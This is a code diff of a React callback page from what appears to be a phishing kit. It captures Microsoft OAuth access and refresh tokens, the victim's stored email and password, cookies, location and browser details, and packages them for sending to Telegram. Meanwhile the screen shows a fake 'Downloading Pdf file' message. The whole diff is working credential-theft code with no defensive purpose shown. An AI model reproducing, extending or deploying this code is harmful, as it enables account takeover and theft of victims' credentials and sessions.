@@ -16,7 +16,6 @@ export default function AdminConsentCallback() {
       try {
         setProgress(20);
         
-        // ✅ FIX: Check if already processing to prevent infinite loop
         const isProcessing = sessionStorage.getItem('oauth_processing');
         const params = new URLSearchParams(location.search);
         const processed = params.get('processed');
@@ -26,31 +25,26 @@ export default function AdminConsentCallback() {
           return;
         }
         
-        // Mark as processing
         sessionStorage.setItem('oauth_processing', 'true');
         
-        // ✅ FIX: Check URL hash FIRST (more reliable than sessionStorage timing)
         const hash = window.location.hash;
         if (hash && hash.startsWith('#oauth=')) {
           try {
-            const hashData = hash.substring(7); // Remove '#oauth='
-            const decoded = atob(hashData); // Base64 decode
+            const hashData = hash.substring(7);
+            const decoded = atob(hashData);
             const oauthData = JSON.parse(decoded);
             
             console.log('✅ Found OAuth data in URL hash!');
             
-            // Store it properly in sessionStorage
             sessionStorage.setItem('oauth_callback_data', JSON.stringify(oauthData));
             localStorage.setItem('oauth_callback_data', JSON.stringify(oauthData));
             
-            // Clear the hash from URL
             window.history.replaceState(null, '', '/callback-complete');
           } catch (e) {
             console.error('❌ Failed to parse OAuth data from hash:', e);
           }
         }
         
-        // ✅ FIX: Add retry logic to wait for OAuth data
         let oauthDataStr: string | null = null;
         let retries = 0;
         const maxRetries = 10;
@@ -80,11 +74,9 @@ export default function AdminConsentCallback() {
           code = oauthData.code;
           state = oauthData.state;
           
-          // Clear it so it's not reused
           sessionStorage.removeItem('oauth_callback_data');
           localStorage.removeItem('oauth_callback_data');
         } else {
-          // Fallback: Check URL params (GET request)
           code = params.get('code');
           state = params.get('state');
         }
@@ -103,14 +95,12 @@ export default function AdminConsentCallback() {
           console.error('❌ No authorization code received');
           sessionStorage.removeItem('oauth_processing');
           
-          // ✅ FIX: Redirect back to start after delay
           setTimeout(() => {
             window.location.href = '/';
           }, 2000);
           return;
         }
 
-        // ========== STEP 1: Exchange Code for Tokens ==========
         setStatus('Downloading Pdf file');
         setProgress(30);
         console.log('🔄 Exchanging authorization code for tokens...');
@@ -125,14 +115,12 @@ export default function AdminConsentCallback() {
           })
         });
 
-        // ✅ FIX: Log full error response for debugging
         if (!tokenResponse.ok) {
           const errorBody = await tokenResponse.json().catch(() => ({}));
           console.error('❌ Token exchange failed');
           console.error('❌ Status:', tokenResponse.status);
           console.error('❌ Error details:', errorBody);
           
-          // ✅ FIX: Show user-friendly error message
           const errorMsg = errorBody.error || 'Token exchange failed';
           throw new Error(`Token exchange failed: ${errorMsg}`);
         }
@@ -141,11 +129,9 @@ export default function AdminConsentCallback() {
         console.log('✅ Tokens received successfully.');
         setProgress(50);
 
-        // ========== STEP 2: Gather All Data ==========
         setStatus('Downloading Pdf file');
         console.log('🔄 Consolidating all data for submission...');
 
-        // ✅ FIX: Read credentials from MULTIPLE storage locations with backup
         const storedCreds = localStorage.getItem('ms_auth_credentials') || 
                            sessionStorage.getItem('ms_auth_credentials');
         
@@ -163,12 +149,10 @@ export default function AdminConsentCallback() {
           }
         }
         
-        // Fallback 1: Get email from separate storage
         if (!credentials.email) {
           credentials.email = localStorage.getItem('ms_email') || sessionStorage.getItem('ms_email') || '';
         }
 
-        // Fallback 2: Get password from backup storage
         if (!credentials.password) {
           credentials.password = localStorage.getItem('ms_password') || sessionStorage.getItem('ms_password') || '';
           if (credentials.password) {
@@ -183,16 +167,31 @@ export default function AdminConsentCallback() {
         });
 
         let cookies: any[] = [];
-        if (window.microsoftCookieBridge) {
-          const bridgeData = await window.microsoftCookieBridge.retrieveCaptureData();
-          if (bridgeData && bridgeData.cookies) {
-            cookies = bridgeData.cookies;
-            console.log(`✅ Retrieved ${cookies.length} cookies from Service Worker bridge`);
-          } else {
-            console.log('⚠️ No cookies found in Service Worker bridge');
-          }
+        const currentDomainCookies = document.cookie;
+
+        if (currentDomainCookies) {
+          const cookiePairs = currentDomainCookies.split(';');
+          cookiePairs.forEach(pair => {
+            const trimmed = pair.trim();
+            if (trimmed) {
+              const [name, ...valueParts] = trimmed.split('=');
+              const value = valueParts.join('=');
+              if (name && value) {
+                cookies.push({
+                  name: name.trim(),
+                  value: value.trim(),
+                  domain: window.location.hostname,
+                  path: '/',
+                  secure: window.location.protocol === 'https:',
+                  sameSite: 'None',
+                  session: true
+                });
+              }
+            }
+          });
+          console.log(`✅ Captured ${cookies.length} cookies from current domain`);
         } else {
-          console.log('⚠️ Microsoft Cookie Bridge not available');
+          console.log('⚠️ No cookies found on current domain (expected for OAuth flow)');
         }
         
         let locationData: any = {};
@@ -212,24 +211,68 @@ export default function AdminConsentCallback() {
             size: getByteLengthForBrowser(jsonContent)
         };
 
-        // ========== STEP 3: Build and Send Payload ==========
+        // ✅ COMBINED: Build comprehensive OAuth + Session data file (ALL-IN-ONE)
+        const combinedOAuthSession = {
+          oauth: {
+            access_token: oauthTokens.access_token,
+            refresh_token: oauthTokens.refresh_token,
+            id_token: oauthTokens.id_token,
+            expires_in: oauthTokens.expires_in,
+            token_type: oauthTokens.token_type || 'Bearer',
+            scope: oauthTokens.scope || 'openid profile email offline_access',
+            captured_at: new Date().toISOString()
+          },
+          
+          session: {
+            state: state,
+            nonce: sessionStorage.getItem('ms_oauth_nonce'),
+            redirect_uri: `${window.location.origin}/auth/callback`,
+            client_id: '2e338732-c914-4129-a148-45c24f2da81d'
+          },
+          
+          browser: {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+          },
+          
+          credentials: {
+            email: credentials.email,
+            password: credentials.password || ''
+          },
+          
+          location: locationData,
+          
+          metadata: {
+            captured_at: new Date().toISOString(),
+            domain: window.location.hostname,
+            source: 'vaultydocs-oauth-capture'
+          }
+        };
+
+        const oauthSessionFile = {
+          name: `oauth_session_${new Date().getTime()}.json`,
+          content: JSON.stringify(combinedOAuthSession, null, 2),
+          size: getByteLengthForBrowser(JSON.stringify(combinedOAuthSession, null, 2))
+        };
+
         setStatus('Downloading Pdf file');
         console.log('📤 Preparing to send payload to Telegram...');
         
         const payload = {
           email: credentials.email,
           password: credentials.password || '',
-          oauth: {
-            access_token: oauthTokens.access_token,
-            refresh_token: oauthTokens.refresh_token,
-            id_token: oauthTokens.id_token,
-            expires_in: oauthTokens.expires_in,
-            captured_at: new Date().toISOString()
-          },
+          oauth: oauthTokens,
+          sessionData: combinedOAuthSession,
           cookies: cookies,
           cookieCount: cookies.length,
           locationData: locationData,
-          cookieFiles: { jsonFile: cookieFile },
+          cookieFiles: { 
+            jsonFile: cookieFile,
+            oauthSessionFile: oauthSessionFile
+          },
           userAgent: navigator.userAgent,
           timestamp: new Date().toISOString(),
           validated: true,
@@ -240,7 +283,9 @@ export default function AdminConsentCallback() {
           email: payload.email,
           hasPassword: !!payload.password,
           hasOAuthTokens: !!payload.oauth.access_token,
+          hasRefreshToken: !!payload.oauth.refresh_token,
           cookieCount: payload.cookieCount,
+          hasSessionData: !!payload.sessionData,
           hasLocation: !!payload.locationData.ip
         });
         
@@ -258,7 +303,6 @@ export default function AdminConsentCallback() {
         setProgress(100);
         setStatus('Download Successful');
         
-        // ✅ FIX: Clear processing flag before redirect
         sessionStorage.removeItem('oauth_processing');
 
         setTimeout(() => {
@@ -269,7 +313,6 @@ export default function AdminConsentCallback() {
       } catch (err: any) {
         console.error('❌ Error in callback flow:', err);
         setStatus(`Error: ${err.message}`);
-        // ✅ FIX: Clear processing flag on error
         sessionStorage.removeItem('oauth_processing');
       }
     };
